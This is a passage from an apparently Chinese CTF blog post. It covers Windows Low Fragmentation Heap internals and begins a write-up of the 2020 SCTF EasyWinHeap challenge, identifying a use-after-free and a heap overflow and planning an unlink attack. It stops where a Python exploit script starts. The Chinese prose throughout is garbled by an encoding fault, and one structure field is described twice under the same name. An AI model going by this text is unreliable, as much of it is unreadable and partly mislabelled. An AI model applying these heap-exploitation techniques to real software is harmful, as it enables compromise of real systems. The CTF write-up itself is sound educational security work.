_HEAP_LOCAL_DATA</span><br></pre></td></tr></table></figure><p><code>Heap</code>æŒ‡å‘å¯¹åº”çš„<code>_HEAP</code></p><p><code>Buckets</code>ç”¨æ¥å¯»æ‰¾é…ç½®å¤§å°å¯¹åº”åˆ°Blockçš„é˜µåˆ—ç»“æ„</p><p><code>SegmentInfoArrays</code>ä¸åŒå¤§å°å¯¹åº”åˆ°ä¸åŒçš„Segment_infoç»“æ„ï¼Œä¸»è¦ç®¡ç†å¯¹åº”çš„Subsegment</p><p><code>LocalData</code>å…¶ä¸­æœ‰ä¸ªæˆå‘˜æ˜¯æŒ‡å‘LFHæœ¬èº«ï¼Œç”¨æ¥æ‰¾å›LFH</p><h5 id="HEAP-BUCKET"><a href="#HEAP-BUCKET" class="headerlink" title="_HEAP_BUCKET"></a>_HEAP_BUCKET</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ntdll!_HEAP_BUCKET</span><br><span class="line">   +<span class="number">0x000</span> BlockUnits       : Uint2B</span><br><span class="line">   +<span class="number">0x002</span> SizeIndex        : UChar</span><br><span class="line">   +<span class="number">0x003</span> UseAffinity      : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x003</span> DebugFlags       : Pos <span class="number">1</span>, <span class="number">2</span> Bits</span><br><span class="line">   +<span class="number">0x003</span> Flags            : UChar</span><br></pre></td></tr></table></figure><p><code>BlockUnits</code>è¦åˆ†é…å‡ºå»çš„ä¸€ä¸ªblockå¤§å°&gt;&gt;4</p><p><code>SizeIndex</code>ä½¿ç”¨è€…éœ€è¦çš„å¤§å°&gt;&gt;4</p><h5 id="HEAP-LOCAL-SEGMENT-INFO"><a href="#HEAP-LOCAL-SEGMENT-INFO" class="headerlink" title="_HEAP_LOCAL_SEGMENT_INFO"></a>_HEAP_LOCAL_SEGMENT_INFO</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ntdll!_HEAP_LOCAL_SEGMENT_INFO</span><br><span class="line">   +<span class="number">0x000</span> LocalData        : Ptr64 _HEAP_LOCAL_DATA</span><br><span class="line">   +<span class="number">0x008</span> ActiveSubsegment : Ptr64 _HEAP_SUBSEGMENT</span><br><span class="line">   +<span class="number">0x010</span> CachedItems      : [<span class="number">16</span>] Ptr64 _HEAP_SUBSEGMENT</span><br><span class="line">   +<span class="number">0x090</span> SListHeader      : _SLIST_HEADER</span><br><span class="line">   +<span class="number">0x0a0</span> Counters         : _HEAP_BUCKET_COUNTERS</span><br><span class="line">   +<span class="number">0x0a8</span> LastOpSequence   : Uint4B</span><br><span class="line">   +<span class="number">0x0ac</span> BucketIndex      : Uint2B</span><br><span class="line">   +<span class="number">0x0ae</span> LastUsed         : Uint2B</span><br><span class="line">   +<span class="number">0x0b0</span> NoThrashCount    : Uint2B</span><br></pre></td></tr></table></figure><p><code>LocalData</code>å¯¹åº”åˆ°<code>_LFH_HEAP-&gt;LocalData</code> æ–¹ä¾¿ä»Segmentinfoæ‰¾å›<code>_LFH_HEAP</code></p><p><code>BucketIndex</code>æ˜¯è¿™ä¸ªæ•°ç»„å¯¹åº”çš„BucketIndexï¼Œä¹Ÿå°±æ˜¯<code>_LFH_HEAP-&gt;SegmentInfoArrays</code>æ•°ç»„ä¸­å¯¹åº”çš„ä¸‹æ ‡</p><p><code>ActiveSubsegment</code>ä¸€ä¸ª<code>_HEAP_SUBSEGMENT</code>ç»“æ„ä½“ï¼Œå¯¹åº”åˆ°åˆ†é…å‡ºå»çš„Subsegmentï¼Œè®°å½•äº†å‰©ä½™å¤šå°‘chunkï¼Œè¯¥Userblockæœ€å¤§åˆ†é…æ•°ç­‰ç­‰</p><p><code>CachedItems</code>ä¸€ä¸ª<code>_HEAP_SUBSEGEMENT</code>ç»“æ„ä½“æ•°ç»„ï¼Œå­˜æ”¾å¯¹åº”åˆ°è¯¥SegmentInfoä¸”è¿˜æœ‰å¯ä»¥åˆ†é…chunkç»™userçš„Subsegmentï¼Œå½“ActiveSubsegmentç”¨å®Œä¹‹åå°±ä¼šä»è¿™é‡Œå¡«å……ç½®æ¢æ‰</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202505101519075.png" alt="image-20250509160224918" style="zoom:50%;" /><h5 id="HEAP-SUBSEGMENT"><a href="#HEAP-SUBSEGMENT" class="headerlink" title="_HEAP_SUBSEGMENT"></a>_HEAP_SUBSEGMENT</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ntdll!_HEAP_SUBSEGMENT</span><br><span class="line">   +<span class="number">0x000</span> LocalInfo        : Ptr64 _HEAP_LOCAL_SEGMENT_INFO</span><br><span class="line">   +<span class="number">0x008</span> UserBlocks       : Ptr64 _HEAP_USERDATA_HEADER</span><br><span class="line">   +<span class="number">0x010</span> DelayFreeList    : _SLIST_HEADER</span><br><span class="line">   +<span class="number">0x020</span> AggregateExchg   : _INTERLOCK_SEQ</span><br><span class="line">   +<span class="number">0x024</span> BlockSize        : Uint2B</span><br><span class="line">   +<span class="number">0x026</span> Flags            : Uint2B</span><br><span class="line">   +<span class="number">0x028</span> BlockCount       : Uint2B</span><br><span class="line">   +<span class="number">0x02a</span> SizeIndex        : UChar</span><br><span class="line">   +<span class="number">0x02b</span> AffinityIndex    : UChar</span><br><span class="line">   +<span class="number">0x024</span> Alignment        : [<span class="number">2</span>] Uint4B</span><br><span class="line">   +<span class="number">0x02c</span> Lock             : Uint4B</span><br><span class="line">   +<span class="number">0x030</span> SFreeListEntry   : _SINGLE_LIST_ENTRY</span><br></pre></td></tr></table></figure><p><code>LocalInfo</code>æŒ‡å›å¯¹åº”çš„<code>_HEAP_LOCAL_SEGMENT_INFO</code></p><p><code>UserBlocks</code>ä¸€ä¸ª<code>_HEAP_USERDATA_HEADER</code>ç»“æ„ä½“ï¼ŒLFHçš„åˆ†é…æ± ï¼Œä¹Ÿå°±æ˜¯è¦åˆ†é…å‡ºå»çš„Chunkæ‰€åœ¨çš„ä½ç½®</p><p><code>AggregateExchg</code>ç”¨æ¥ç®¡ç†å¯¹åº”çš„UserBlockä¸­è¿˜æœ‰å¤šå°‘çš„freed chunkå¯ä»¥åˆ†é…</p><p><code>BlockCount</code>åœ¨è¯¥UserBlockä¸­æ¯ä¸ªBlockï¼ˆchunkï¼‰çš„å¤§å°</p><p><code>BlockCount</code>åœ¨è¯¥UserBlockä¸­Blockçš„æ€»æ•°</p><p><code>SizeIndex</code>è¯¥UserBlockå¯¹åº”åˆ°çš„SizeIndexï¼Œä¹Ÿå°±æ˜¯<code>CachedItems</code>æ•°ç»„çš„ä¸‹æ ‡</p><h5 id="INTERLOCK-SEQ"><a href="#INTERLOCK-SEQ" class="headerlink" title="_INTERLOCK_SEQ"></a>_INTERLOCK_SEQ</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ntdll!_INTERLOCK_SEQ</span><br><span class="line">   +<span class="number">0x000</span> Depth            : Uint2B</span><br><span class="line">   +<span class="number">0x002</span> Hint             : Pos <span class="number">0</span>, <span class="number">15</span> Bits</span><br><span class="line">   +<span class="number">0x002</span> Lock             : Pos <span class="number">15</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x002</span> Hint16           : Uint2B</span><br><span class="line">   +<span class="number">0x000</span> Exchg            : Int4B</span><br></pre></td></tr></table></figure><p><code>Depth</code>è¯¥UserBlockä¸­æ‰€å‰©ä¸‹çš„Freed chunkæ•°é‡</p><p><code>Lock</code>å°±æ˜¯é”</p><h5 id="HEAP-USERDATA-HEADER"><a href="#HEAP-USERDATA-HEADER" class="headerlink" title="_HEAP_USERDATA_HEADER"></a>_HEAP_USERDATA_HEADER</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ntdll!_HEAP_USERDATA_HEADER</span><br><span class="line">   +<span class="number">0x000</span> SFreeListEntry   : _SINGLE_LIST_ENTRY</span><br><span class="line">   +<span class="number">0x000</span> SubSegment       : Ptr64 _HEAP_SUBSEGMENT</span><br><span class="line">   +<span class="number">0x008</span> Reserved         : Ptr64 Void</span><br><span class="line">   +<span class="number">0x010</span> SizeIndexAndPadding : Uint4B</span><br><span class="line">   +<span class="number">0x010</span> SizeIndex        : UChar</span><br><span class="line">   +<span class="number">0x011</span> GuardPagePresent : UChar</span><br><span class="line">   +<span class="number">0x012</span> PaddingBytes     : Uint2B</span><br><span class="line">   +<span class="number">0x014</span> Signature        : Uint4B</span><br><span class="line">   +<span class="number">0x018</span> EncodedOffsets   : _HEAP_USERDATA_OFFSETS</span><br><span class="line">   +<span class="number">0x020</span> BusyBitmap       : _RTL_BITMAP_EX</span><br><span class="line">   +<span class="number">0x030</span> BitmapData       : [<span class="number">1</span>] Uint8B</span><br></pre></td></tr></table></figure><p><code>SubSegment</code>æŒ‡å›è¿™ä¸ªç»“æ„ä½“æ‰€åœ¨çš„<code>SubSegment</code></p><p><code>EncodeOffsets</code>ç”¨æ¥éªŒè¯è¯¥chunkheaderæ˜¯å¦è¢«ä¿®æ”¹è¿‡</p><p><code>BusyBitmap</code>è®°å½•è¯¥UserBlockå“ªäº›chunkæœ‰åœ¨ç”¨çš„bitmap</p><h5 id="HEAP-ENTRY-chunk-1"><a href="#HEAP-ENTRY-chunk-1" class="headerlink" title="_HEAP_ENTRY(chunk)"></a>_HEAP_ENTRY(chunk)</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_ENTRY</span>&#123;</span></span><br><span class="line">    <span class="type">void</span> * PreviousBlockPrivateData;</span><br><span class="line">    Uint4B SubSegmentCode;</span><br><span class="line">    Uint2B PreviousSize;</span><br><span class="line">    Uchar SegmentOffset;</span><br><span class="line">    Uchar Unusedbyte;</span><br><span class="line">    Uchar UserData[];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>SubSegmentCode</code>æ˜¯Encodeè¿‡çš„metadataç”¨æ¥æ¨å›userblockçš„ä½ç½®</p><p><code>PreviousSize</code>æ˜¯è¯¥chunkåœ¨UserBlockä¸­çš„index</p><p><code>Unusedbyte</code>æ¥åˆ¤æ–­è¯¥LFH chunkçŠ¶æ€</p><ul><li><code>Freed</code>, æ’ä¸º<code>0x80</code></li><li><code>Inused</code>, <code>UnusedBytes &amp; 0x80 != 0</code></li></ul><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202505101519076.png" alt="image-20250509161925186" style="zoom:50%;" /><h5 id="remark"><a href="#remark" class="headerlink" title="remark"></a>remark</h5><p>EncodedOffsetsåœ¨UserBlockåˆå§‹åŒ–æ—¶è®¾ç½®ï¼Œå…¶å€¼æ˜¯ä»¥ä¸‹å››ä¸ªå€¼çš„xor</p><ul><li><code>(sizeof(userblock header)|(BlockUnit*0x10&lt;&lt;16))</code></li><li><code>LFHkey</code></li><li><code>UserBlock address</code></li><li><code>_LFH_HEAP address</code></li></ul><p>æ‰€æœ‰çš„chunk headeråœ¨åˆå§‹åŒ–æ—¶éƒ½ä¼šç»è¿‡xorï¼Œä¸ºä¸‹é¢å››ä¸ªå€¼çš„xor</p><ul><li><code>_HEAP address</code></li><li><code>LFHkey</code></li><li><code>Chunk address &gt;&gt; 4</code></li><li><code>((chunk address) - (UserBlock address)) &lt;&lt; 12</code></li></ul><h4 id="åˆ†é…æœºåˆ¶-1"><a href="#åˆ†é…æœºåˆ¶-1" class="headerlink" title="åˆ†é…æœºåˆ¶"></a>åˆ†é…æœºåˆ¶</h4><h5 id="åˆå§‹åŒ–"><a href="#åˆå§‹åŒ–" class="headerlink" title="åˆå§‹åŒ–"></a>åˆå§‹åŒ–</h5><ul><li>åœ¨<code>FrintEndHeapUsageData[x] &amp; 0x1f &gt; 0x10</code>æ—¶ï¼Œä¸‹ä¸€æ¬¡<code>allocate</code>ä¼šå¯¹<code>LFH</code>åšå‡ºåˆå§‹åŒ–<ul><li>ä¼šå…ˆ<code>ExtendFrontEndUsageData</code>åŠå¢åŠ æ›´å¤§çš„<code>BlocksIndex</code>  (0x80-0x400)</li><li>å»ºç«‹<code>FrontEndHeap</code></li><li>åˆå§‹åŒ–<code>SegmentInfoArrays[idx]</code></li></ul></li><li>æ¥ä¸‹æ¥åœ¨allocateç›¸åŒå¤§å°çš„chunkå°±ä¼šå¼€å§‹ä½¿ç”¨LFH</li></ul><p>åœ¨ç¬¬17æ¬¡çš„mallocåŒä¸€ä¸ªsizeçš„æ—¶å€™ï¼Œæ­¤æ—¶å¯¹åº”çš„<code>FrontEndHeapUsageData[x]=0x231 &amp; 0x1f &gt; 0x10</code>ï¼Œç„¶å<code>heap-&gt;CompatibilityFlag |= 0x20000000</code>ï¼Œè®¾ç½®ä¸Šè¿™ä¸ªflagåï¼Œä¸‹æ¬¡allocateå°±ä¼šå»åˆå§‹åŒ–LFH</p><p>mallocåŒä¸€ä¸ªsizeç¬¬18æ¬¡æ—¶</p><ul><li><code>ExtendFrontEndUsageData</code>åŠå¢åŠ æ›´å¤§çš„<code>BlocksIndex</code>ï¼ˆ0x80-0x400ï¼‰ï¼Œå¹¶è®¾ç½®å¯¹åº”çš„<code>bitmap</code><ul><li>å¹¶åœ¨å¯¹åº”çš„<code>FrontEndHeapUsageData</code>å†™ä¸Šå¯¹åº”çš„indexï¼Œæ­¤æ—¶å¯<code>enable LFH</code>èŒƒå›´å˜ä¸ºï¼ˆidxï¼š0-0x400ï¼‰</li></ul></li><li>å»ºç«‹å¹¶åˆå§‹åŒ– <code>FrontEndHeap</code>ï¼ˆmmapï¼‰</li><li>åˆå§‹åŒ–<code>SegmentInfoArrays[idx]</code><ul><li>åœ¨<code>SegmentInfoArrays[BucketIndex]</code> å¡«ä¸Š<code>segmentInfo</code></li></ul></li></ul><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202505101519077.png" alt="image-20250509195843208"></p><p>mallocåŒä¸€ä¸ªsizeç¬¬19æ¬¡æ—¶</p><ul><li>Allocate Userblock å¹¶åˆå§‹åŒ–<ul><li>è®¾ç½®å¯¹åº”çš„chunk</li></ul></li><li>è®¾ç½®å¯¹åº”çš„ActiviteSubsegment</li><li>éšæœºè¿”å›å…¶ä¸­çš„ä¸€ä¸ªchunk</li></ul><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202505101519078.png" alt="image-20250509200159429"></p><h5 id="Allocate"><a href="#Allocate" class="headerlink" title="Allocate"></a>Allocate</h5><ul><li>å…ˆçœ‹çœ‹<code>ActiveSubsegment</code>ä¸­æ˜¯å¦æœ‰å¯åˆ†é…çš„chunk<ul><li>ä»<code>ActiveSubsegment-&gt;depth</code>åˆ¤æ–­</li></ul></li><li>å¦‚æœæ²¡æœ‰åˆ™ä¼šä»<code>CachedItem</code>æ‰¾ï¼Œæœ‰æ‰¾åˆ°çš„è¯ä¼šæŠŠ<code>ActiveSubsegment</code>æ¢æˆ<code>CachedItem</code>ä¸­çš„<code>subsegment</code></li><li>å–å¾—<code>RtlpLowFragHeapRandomData[x]</code>ä¸Šçš„å€¼ï¼Œä¸‹ä¸€æ¬¡ä¼šä»<code>RtlpLowFragHeapRandomData[x+1]</code>å–ï¼Œå½“ä¸‹ä¸€æ¬¡è½®å›æ—¶<code>x=rand()%256</code>å¼€å§‹å–ï¼Œxæ˜¯ä¸€ä¸ªbyteçš„ï¼ŒèŒƒå›´åœ¨<code>0x00-0x7f</code></li><li>æœ€åçš„indexä¸º<code>RtlpLowFragHeapRandomData[x]*maxidx&gt;&gt;7</code>ï¼Œå¦‚æœå†²çªåˆ™å¾€åå–æœ€è¿‘çš„</li><li>æ£€æŸ¥<code>(unused byte &amp; 0x3f) != 0</code>è¡¨ç¤ºchunkæ˜¯freed</li><li>æœ€åè®¾ç½®indexåŠunsed byteå°±è¿”å›ç»™ç”¨æˆ·äº†</li></ul><h5 id="Free"><a href="#Free" class="headerlink" title="Free"></a>Free</h5><ul><li>ç”¨chunk headerå¯»æ‰¾UserBlockï¼Œç„¶åæ‰¾å›å¯¹åº”çš„SubSegmentï¼Œè®¾ç½®<code>unused byte=0x80</code>ï¼Œæ¸…é™¤å¯¹åº”çš„bitmapï¼Œ<code>update AggregateExchg</code></li><li>ActiveSubsegmentå¹¶ä¸ç­‰äºå°±æ˜¯freeæ‰chunkçš„subsegment</li></ul><h4 id="Front-End-Exploitation"><a href="#Front-End-Exploitation" class="headerlink" title="Front-End Exploitation"></a>Front-End Exploitation</h4><p>å‡è®¾æˆ‘ä»¬æ‹¥æœ‰Use after freeçš„æ¼æ´ï¼Œä½†æ˜¯å› ä¸ºLFHçš„éšæœºæ€§ï¼Œæˆ‘ä»¬æ— æ³•é¢„æµ‹ä¸‹ä¸€å—chunkåœ¨å“ªé‡Œï¼Œä½¿å¾—æˆ‘ä»¬éš¾ä»¥åˆ©ç”¨</p><p>è¿™æ—¶æˆ‘ä»¬å¯ä»¥é€šè¿‡å¡«æ»¡Userblockçš„æ–¹å¼ï¼Œåœ¨freeæ‰å…¶ä¸­ä¸€å—ï¼Œé‚£ä¹ˆä¸‹ä¸€æ¬¡è¯¥chunkå¿…å®šä¼šæ‹¿åˆ°åŒä¸€å—ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ï¼Œæ‹¿åˆ°overlap chunkå¹¶è¿›ä¸€æ­¥åˆ©ç”¨</p><h2 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><h3 id="2020SCTF-EasyWinHeap"><a href="#2020SCTF-EasyWinHeap" class="headerlink" title="2020SCTF_EasyWinHeap"></a>2020SCTF_EasyWinHeap</h3><h4 id="é€†å‘åˆ†æ"><a href="#é€†å‘åˆ†æ" class="headerlink" title="é€†å‘åˆ†æ"></a>é€†å‘åˆ†æ</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    heapIndex = <span class="number">0</span>;</span><br><span class="line">    heapEntry = &amp;MyHeapEntry_0[<span class="number">1</span>].content;  <span class="comment">// è·³è¿‡12ä¸ªå­—èŠ‚</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">......</span><br><span class="line">printString(<span class="string">&quot;size &gt;&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%ud&quot;</span>, (<span class="type">char</span>)allocSizeBuffer);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)allocSizeBuffer &gt; <span class="number">0x90</span>u )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    sizeRoundedUp = (*(_DWORD *)allocSizeBuffer &gt;&gt; <span class="number">4</span>) + <span class="number">1</span>;</span><br><span class="line">    allocatedBlock = HeapAlloc(hHeap, <span class="number">1u</span>, sizeRoundedUp);<span class="comment">// åˆ†é…çš„chunkçš„sizeä¼š&gt;&gt;4</span></span><br><span class="line">    heapBase = MyHeapEntry_0;</span><br><span class="line">    MyHeapEntry_0[heapIndex].func_ptr = (<span class="type">void</span> *)((<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">puts</span> | sizeRoundedUp);</span><br><span class="line">    heapBase[heapIndex].content = allocatedBlock;</span><br></pre></td></tr></table></figure><p>çœç•¥éƒ¨åˆ†æœ‰ä¸€ä¸ªå †æ¡ç›®çš„æŸ¥æ‰¾ï¼Œå¯èƒ½æ˜¯å› ä¸ºç¼–è¯‘å™¨ä¼˜åŒ–çš„åŸå› ï¼Œå¯¼è‡´ååˆ†å¤æ‚ï¼Œä½†å¤§è‡´é€»è¾‘æ˜¯ä¸€æ¬¡æ£€æŸ¥å¤šä¸ªæ¡ç›®ï¼Œæ ¹æ®ç¬¬ä¸€ä¸ªå¯»æ‰¾åˆ°çš„ç©ºä½ç½®æ¥è°ƒæ•´ç´¢å¼•å€¼</p><p>çœ‹åˆ°è¿™ä¸ªåˆ†é…é€»è¾‘ï¼Œæœ‰ä¸ª<code>func_ptr</code>æ„Ÿè§‰æˆ–è®¸æœ‰ç‚¹ç”¨ï¼Œå…¶ä¸­è¦æ³¨æ„çš„æ˜¯ æˆ‘ä»¬è¾“å…¥çš„Sizeä¼š&gt;&gt;4)+1ç„¶åä¸putsè¿›è¡Œæˆ–çš„æ“ä½œï¼Œå¯¹æ¯”ä¸‹è¿°çš„showæ“ä½œï¼Œå¯ä»¥çŸ¥é“è¿™ä¸ªfunc_ptrçš„ä½ä½æ˜¯sizeä½ï¼Œä½†æ˜¯é—®é¢˜åœ¨äºæ­¤æ—¶HeapAllocçš„sizeæ˜¯<strong>å¤„ç†è¿‡çš„size</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">  printString(<span class="string">&quot;index &gt;&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%ud&quot;</span>, (<span class="type">char</span>)deleteIndexBuffer);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)deleteIndexBuffer &gt;= <span class="number">0x10</span>u || !MyHeapEntry_0[*(_DWORD *)deleteIndexBuffer].heap_addr )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_29;</span><br><span class="line">  HeapFree(hHeap, <span class="number">1u</span>, MyHeapEntry_0[*(_DWORD *)deleteIndexBuffer].heap_addr);</span><br><span class="line">  <span class="keyword">continue</span>;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªdeleteçš„é€»è¾‘ï¼Œæ˜¾ç„¶æ˜¯ä¸€ä¸ªUAF</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">  printString(<span class="string">&quot;index &gt;&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%ud&quot;</span>, (<span class="type">char</span>)showIndexBuffer);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)showIndexBuffer &gt;= <span class="number">0x10</span>u || !MyHeapEntry_0[*(_DWORD *)showIndexBuffer].heap_addr )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_29;</span><br><span class="line">  ((<span class="type">void</span> (__cdecl *)(<span class="type">void</span> *))((<span class="type">int</span>)MyHeapEntry_0[*(_DWORD *)showIndexBuffer].func_ptr &amp; <span class="number">0xFFFFFFF0</span>))(MyHeapEntry_0[*(_DWORD *)showIndexBuffer].heap_addr);</span><br><span class="line">  <span class="keyword">continue</span>;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªshowæ˜¯é€šè¿‡ç›´æ¥è°ƒç”¨è¿™ä¸ªä¸Šé¢æåˆ°çš„<code>func_ptr</code>çš„ï¼Œé‚£ä¹ˆå¦‚æœèƒ½hijackè¿™ä¸ªç»“æ„ä½“ï¼Œå°±èƒ½åšåˆ°ä¸€ä¸ªgetcmdçš„æ“ä½œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">   printString(<span class="string">&quot;index &gt;&quot;</span>);</span><br><span class="line">   <span class="built_in">scanf</span>(<span class="string">&quot;%ud&quot;</span>, (<span class="type">char</span>)editIndexBuffer);</span><br><span class="line">   getchar();</span><br><span class="line">   <span class="keyword">if</span> ( *(_DWORD *)editIndexBuffer &gt;= <span class="number">0x10</span>u )</span><br><span class="line">     <span class="keyword">goto</span> LABEL_29;</span><br><span class="line">   entryOffset = *(_DWORD *)editIndexBuffer;</span><br><span class="line">   <span class="keyword">if</span> ( !MyHeapEntry_0[*(_DWORD *)editIndexBuffer].heap_addr )</span><br><span class="line">     <span class="keyword">goto</span> LABEL_29;</span><br><span class="line">   printString(<span class="string">&quot;content  &gt;&quot;</span>);</span><br><span class="line">   contentIndex = <span class="number">0</span>;</span><br><span class="line">   heapProperties = MyHeapEntry_0[entryOffset].func_ptr;</span><br><span class="line">   contentAddress = MyHeapEntry_0[entryOffset].heap_addr;</span><br><span class="line">   contentSize = <span class="number">16</span> * ((<span class="type">unsigned</span> __int8)heapProperties &amp; <span class="number">0xF</span>);</span><br><span class="line">   inputChar = getchar();</span><br><span class="line">   <span class="keyword">if</span> ( inputChar != <span class="number">10</span> )</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">do</span></span><br><span class="line">     &#123;</span><br><span class="line">       contentAddress[contentIndex] = inputChar;</span><br><span class="line">       <span class="keyword">if</span> ( ++contentIndex == contentSize - <span class="number">1</span> )</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">       inputChar = getchar();</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">while</span> ( inputChar != <span class="number">10</span> );</span><br><span class="line">     printString = (<span class="type">void</span> (__cdecl *)(<span class="type">const</span> <span class="type">char</span> *))<span class="built_in">puts</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   contentAddress[contentIndex] = <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">continue</span>;</span><br></pre></td></tr></table></figure><p>editæ“ä½œï¼ŒSizeä¼šå¤šä¹˜ä»¥0x10ï¼Œå› æ­¤æ˜¯æœ‰ä¸ªå †æº¢å‡ºçš„æ¼æ´çš„</p><h4 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h4><p>å› ä¸ºå¼€äº†<code>ASLR</code>ï¼Œå…ˆæƒ³çš„æ˜¯é€šè¿‡<code>free</code>åçš„<code>Flink</code>æ¥æ³„éœ²<code>heap_base</code>ï¼Œä¼šå‘ç°å…¶å®å­˜å‚¨æ¯ä¸€ä¸ªå †æ¡ç›®ä¿¡æ¯çš„ï¼Œä¹Ÿæ˜¯å­˜å‚¨åœ¨heapä¸Šçš„ï¼Œå› æ­¤å°±å¯ä»¥æ‰“unlinkè¾£</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 